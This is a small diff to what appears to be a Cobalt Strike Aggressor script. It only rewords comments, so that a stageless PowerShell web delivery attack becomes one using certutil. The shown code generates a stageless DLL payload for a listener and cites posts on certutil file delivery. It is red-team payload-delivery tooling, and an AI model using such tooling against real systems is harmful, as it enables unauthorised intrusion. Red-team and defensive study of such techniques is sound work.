@@ -7,7 +7,7 @@
 # https://twitter.com/subTee/status/888071631528235010
 # http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html
 
-# setup our stageless PowerShell Web Delivery attack
+# setup our stageless CertUtil Web Delivery attack
 sub stage_attack {
 	local('%options $script $url $arch');
 	%options = $3;
@@ -15,7 +15,7 @@ sub stage_attack {
 	# get the arch right.
 	$arch = iff(%options["x64"] eq "true", "x64", "x86");
 
-	# generate our stageless PowerShell script. We're going to make *this* function
+	# generate our stageless CertUtil script. We're going to make *this* function
 	# the callback for this call. That's why we yield after.
 	artifact_stageless(%options["listener"], "dll", $arch, $null, $this);
 	yield;
